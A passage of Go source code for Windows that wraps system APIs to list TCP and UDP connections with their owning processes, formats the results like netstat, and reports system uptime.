	if err != nil {
		return nil, err
	}
	return buf, nil
}

// GetTCPTable2 function retrieves the IPv4 TCP connection table
func GetTCPTable2(order bool) (*MibTCPTable2, error) {
	b, err := getTCPTable2(procGetTCPTable2.Addr(), true)
	if err != nil {
		return nil, err
	}
	return (*MibTCPTable2)(unsafe.Pointer(&b[0])), nil
}

// GetTCP6Table2 function retrieves the IPv6 TCP connection table
func GetTCP6Table2(order bool) (*MibTCP6Table2, error) {
	b, err := getTCPTable2(procGetTCP6Table2.Addr(), true)
	if err != nil {
		return nil, err
	}
	return (*MibTCP6Table2)(unsafe.Pointer(&b[0])), nil
}

// The UDPTableClass enumeration defines the set of values used to indicate
// the type of table returned by calls to GetExtendedUDPTable
type UDPTableClass uint

// Possible table class values
const (
	UDPTableBasic UDPTableClass = iota
	UDPTableOwnerPID
	UDPTableOwnerModule
)

func getExtendedUDPTable(table unsafe.Pointer, size *uint32, order bool, af uint32, cl UDPTableClass) error {
	var oint uintptr
	if order {
		oint = 1
	}
	r1, _, callErr := syscall.Syscall6(
		procGetExtendedUDPTable.Addr(),
		uintptr(6),
		uintptr(table),
		uintptr(unsafe.Pointer(size)),
		oint,
		uintptr(af),
		uintptr(cl),
		uintptr(0))
	if callErr != 0 {
		return callErr
	}
	if r1 != 0 {
		return syscall.Errno(r1)
	}
	return nil
}

// GetExtendedUDPTable function retrieves a table that contains a list of UDP
// endpoints available to the application
func GetExtendedUDPTable(order bool, af uint32, cl UDPTableClass) ([]byte, error) {
	var size uint32
	err := getExtendedUDPTable(nil, &size, order, af, cl)
	if err != nil && err != errInsuffBuff {
		return nil, err
	}
	buf := make([]byte, size)
	err = getExtendedUDPTable(unsafe.Pointer(&buf[0]), &size, order, af, cl)
	if err != nil {
		return nil, err
	}
	return buf, nil
}

func GetUDPTableOwnerPID(order bool) (*MibUDPTableOwnerPID, error) {
	b, err := GetExtendedUDPTable(true, syscall.AF_INET, UDPTableOwnerPID)
	if err != nil {
		return nil, err
	}
	return (*MibUDPTableOwnerPID)(unsafe.Pointer(&b[0])), nil
}

func GetUDP6TableOwnerPID(order bool) (*MibUDP6TableOwnerPID, error) {
	b, err := GetExtendedUDPTable(true, syscall.AF_INET6, UDPTableOwnerPID)
	if err != nil {
		return nil, err
	}
	return (*MibUDP6TableOwnerPID)(unsafe.Pointer(&b[0])), nil
}

// ProcessSnapshot wraps the syscall.Handle, which represents a snapshot of
// the specified processes.
type ProcessSnapshot syscall.Handle

// CreateToolhelp32Snapshot takes a snapshot of the specified processes, as
// well as the heaps, modules, and threads used by these processes
func CreateToolhelp32Snapshot(flags uint32, pid uint32) (ProcessSnapshot, error) {
	r1, _, callErr := syscall.Syscall(
		procCreateSnapshot.Addr(),
		uintptr(2),
		uintptr(flags),
		uintptr(pid), 0)
	ret := ProcessSnapshot(r1)
	if callErr != 0 {
		return ret, callErr
	}
	if r1 == InvalidHandleValue {
		return ret, fmt.Errorf("invalid handle value: %#v", r1)
	}
	return ret, nil
}

// ProcPIDToName translates PID to a name
func (snp ProcessSnapshot) ProcPIDToName(pid uint32) string {
	var processEntry Processentry32
	processEntry.Size = uint32(unsafe.Sizeof(processEntry))
	handle := syscall.Handle(snp)
	err := Process32First(handle, &processEntry)
	if err != nil {
		return ""
	}
	for {
		if processEntry.Th32ProcessID == pid {
			return StringFromNullTerminated(processEntry.ExeFile[:])
		}
		err = Process32Next(handle, &processEntry)
		if err != nil {
			return ""
		}
	}
}

// Close releases underlying win32 handle
func (snp ProcessSnapshot) Close() error {
	return syscall.CloseHandle(syscall.Handle(snp))
}

// Process32First retrieves information about the first process encountered
// in a system snapshot
func Process32First(handle syscall.Handle, pe *Processentry32) error {
	pe.Size = uint32(unsafe.Sizeof(*pe))
	r1, _, callErr := syscall.Syscall(
		procProcess32First.Addr(),
		uintptr(2),
		uintptr(handle),
		uintptr(unsafe.Pointer(pe)), 0)
	if callErr != 0 {
		return callErr
	}
	if r1 == 0 {
		return nil
	}
	return nil
}

// Process32Next retrieves information about the next process
// recorded in a system snapshot
func Process32Next(handle syscall.Handle, pe *Processentry32) error {
	pe.Size = uint32(unsafe.Sizeof(*pe))
	r1, _, callErr := syscall.Syscall(
		procProcess32Next.Addr(),
		uintptr(2),
		uintptr(handle),
		uintptr(unsafe.Pointer(pe)), 0)
	if callErr != 0 {
		return callErr
	}
	if r1 == 0 {
		return nil
	}
	return nil
}

// StringFromNullTerminated returns a string from a nul-terminated byte slice
func StringFromNullTerminated(b []byte) string {
	n := bytes.IndexByte(b, '\x00')
	if n < 1 {
		return ""
	}
	return string(b[:n])
}

type winSockEnt interface {
	LocalSock() *SockAddr
	RemoteSock() *SockAddr
	SockState() SkState
	Process(snp ProcessSnapshot) *Process
}

func toSockTabEntry(ws winSockEnt, snp ProcessSnapshot) SockTabEntry {
	return SockTabEntry{
		LocalAddr:  ws.LocalSock(),
		RemoteAddr: ws.RemoteSock(),
		State:      ws.SockState(),
		Process:    ws.Process(snp),
	}
}

func osTCPSocks(accept AcceptFn) ([]SockTabEntry, error) {
	tbl, err := GetTCPTable2(true)
	if err != nil {
		return nil, err
	}
	snp, err := CreateToolhelp32Snapshot(Th32csSnapProcess, 0)
	if err != nil {
		return nil, err
	}
	var sktab []SockTabEntry
	s := tbl.Rows()
	for i := range s {
		ent := toSockTabEntry(&s[i], snp)
		if accept(&ent) {
			sktab = append(sktab, ent)
		}
	}
	snp.Close()
	return sktab, nil
}

func osTCP6Socks(accept AcceptFn) ([]SockTabEntry, error) {
	tbl, err := GetTCP6Table2(true)
	if err != nil {
		return nil, err
	}
	snp, err := CreateToolhelp32Snapshot(Th32csSnapProcess, 0)
	if err != nil {
		return nil, err
	}
	var sktab []SockTabEntry
	s := tbl.Rows()
	for i := range s {
		ent := toSockTabEntry(&s[i], snp)
		if accept(&ent) {
			sktab = append(sktab, ent)
		}
	}
	snp.Close()
	return sktab, nil
}

func osUDPSocks(accept AcceptFn) ([]SockTabEntry, error) {
	tbl, err := GetUDPTableOwnerPID(true)
	if err != nil {
		return nil, err
	}
	snp, err := CreateToolhelp32Snapshot(Th32csSnapProcess, 0)
	if err != nil {
		return nil, err
	}
	var sktab []SockTabEntry
	s := tbl.Rows()
	for i := range s {
		ent := toSockTabEntry(&s[i], snp)
		if accept(&ent) {
			sktab = append(sktab, ent)
		}
	}
	snp.Close()
	return sktab, nil
}

func osUDP6Socks(accept AcceptFn) ([]SockTabEntry, error) {
	tbl, err := GetUDP6TableOwnerPID(true)
	if err != nil {
		return nil, err
	}
	snp, err := CreateToolhelp32Snapshot(Th32csSnapProcess, 0)
	if err != nil {
		return nil, err
	}
	var sktab []SockTabEntry
	s := tbl.Rows()
	for i := range s {
		ent := toSockTabEntry(&s[i], snp)
		if accept(&ent) {
			sktab = append(sktab, ent)
		}
	}
	snp.Close()
	return sktab, nil
}

const (
	protoIPv4 = 0x01
	protoIPv6 = 0x02
)

// Accepts "udp" or "tcp"
func Netstat(filter string) (stdout string, stderr string) {
	var udp bool
	var tcp bool
	switch filter {
	case "udp":
		udp = true
	case "tcp":
		tcp = true
	default:
		udp = true
		tcp = true
	}
	listening := false
	all := true
	ipv4 := true
	ipv6 := true

	var proto uint
	if ipv4 {
		proto |= protoIPv4
	}
	if ipv6 {
		proto |= protoIPv6
	}
	if proto == 0x00 {
		proto = protoIPv4 | protoIPv6
	}

	if os.Geteuid() != 0 {
		stdout += fmt.Sprintf("Not all processes could be identified, you would have to be root to see it all.\n")
	}
	stdout += fmt.Sprintf("Proto %-23s %-23s %-12s %-16s\n", "Local Addr", "Foreign Addr", "State", "PID/Program name")

	if udp {
		if proto&protoIPv4 == protoIPv4 {
			tabs, err := UDPSocks(NoopFilter)
			if err == nil {
				proto := "udp"
				lookup := func(skaddr *SockAddr) string {
					const IPv4Strlen = 17
					addr := skaddr.IP.String()
					if len(addr) > IPv4Strlen {
						addr = addr[:IPv4Strlen]
					}
					return fmt.Sprintf("%s:%d", addr, skaddr.Port)
				}

				for _, e := range tabs {
					p := ""
					if e.Process != nil {
						p = e.Process.String()
					}
					saddr := lookup(e.LocalAddr)
					daddr := lookup(e.RemoteAddr)
					stdout += fmt.Sprintf("%-5s %-23.23s %-23.23s %-12s %-16s\n", proto, saddr, daddr, e.State, p)
				}
			}
		}
		if proto&protoIPv6 == protoIPv6 {
			tabs, err := UDP6Socks(NoopFilter)
			if err == nil {
				proto := "udp6"
				lookup := func(skaddr *SockAddr) string {
					const IPv4Strlen = 17
					addr := skaddr.IP.String()
					if len(addr) > IPv4Strlen {
						addr = addr[:IPv4Strlen]
					}
					return fmt.Sprintf("%s:%d", addr, skaddr.Port)
				}

				for _, e := range tabs {
					p := ""
					if e.Process != nil {
						p = e.Process.String()
					}
					saddr := lookup(e.LocalAddr)
					daddr := lookup(e.RemoteAddr)
					stdout += fmt.Sprintf("%-5s %-23.23s %-23.23s %-12s %-16s\n", proto, saddr, daddr, e.State, p)
				}
			}
		}
	} else {
		tcp = true
	}

	if tcp {
		var fn AcceptFn

		switch {
		case all:
			fn = func(*SockTabEntry) bool { return true }
		case listening:
			fn = func(s *SockTabEntry) bool {
				return s.State == Listen
			}
		default:
			fn = func(s *SockTabEntry) bool {
				return s.State != Listen
			}
		}

		if proto&protoIPv4 == protoIPv4 {
			tabs, err := TCPSocks(fn)
			if err == nil {
				proto := "tcp"
				lookup := func(skaddr *SockAddr) string {
					const IPv4Strlen = 17
					addr := skaddr.IP.String()
					if len(addr) > IPv4Strlen {
						addr = addr[:IPv4Strlen]
					}
					return fmt.Sprintf("%s:%d", addr, skaddr.Port)
				}

				for _, e := range tabs {
					p := ""
					if e.Process != nil {
						p = e.Process.String()
					}
					saddr := lookup(e.LocalAddr)
					daddr := lookup(e.RemoteAddr)
					stdout += fmt.Sprintf("%-5s %-23.23s %-23.23s %-12s %-16s\n", proto, saddr, daddr, e.State, p)
				}
			}
		}
		if proto&protoIPv6 == protoIPv6 {
			tabs, err := TCP6Socks(fn)
			if err == nil {
				proto := "tcp6"
				lookup := func(skaddr *SockAddr) string {
					const IPv4Strlen = 17
					addr := skaddr.IP.String()
					if len(addr) > IPv4Strlen {
						addr = addr[:IPv4Strlen]
					}
					return fmt.Sprintf("%s:%d", addr, skaddr.Port)
				}

				for _, e := range tabs {
					p := ""
					if e.Process != nil {
						p = e.Process.String()
					}
					saddr := lookup(e.LocalAddr)
					daddr := lookup(e.RemoteAddr)
					stdout += fmt.Sprintf("%-5s %-23.23s %-23.23s %-12s %-16s\n", proto, saddr, daddr, e.State, p)
				}
			}
		}
	}
	return stdout, ""
}

//END NETSTAT CODE

func Uptime() (stdout string, stderr string) {
	var kernel32DLL = syscall.MustLoadDLL("kernel32")
	var procGetTickCount64 = kernel32DLL.MustFindProc("GetTickCount64")
	r1, _, e1 := syscall.Syscall(procGetTickCount64.Addr(), 0, 0, 0, 0)

	if e1 != 0 {
		stderr += fmt.Sprintf("Uptime failed\n")
		stderr += fmt.Sprintf("%s\n", e1.Error())
		return "", stderr
	} else {
		stdout += fmt.Sprintf("System uptime: %s\n", (time.Duration(r1) * time.Millisecond))
		return stdout, ""
	}
}
